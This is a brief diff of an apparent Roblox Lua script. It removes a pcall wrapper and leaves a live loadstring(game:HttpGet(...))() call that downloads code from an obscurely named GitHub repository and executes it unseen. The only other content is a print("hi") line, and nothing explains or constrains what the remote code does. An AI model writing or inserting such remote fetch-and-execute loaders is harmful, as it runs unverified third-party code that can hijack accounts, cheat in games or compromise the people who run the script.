@@ -1,4 +1,3 @@
-local success, result = pcall(function()
 print("hi")
-    loadstring(game:HttpGet("https://github.com/84wbhtuwign8wagb7/tfnfgnfgnfgnf/blob/main/vrdesv"))()
-end)
+loadstring(game:HttpGet("https://github.com/84wbhtuwign8wagb7/tfnfgnfgnfgnf/blob/main/vrdesv"))()
+
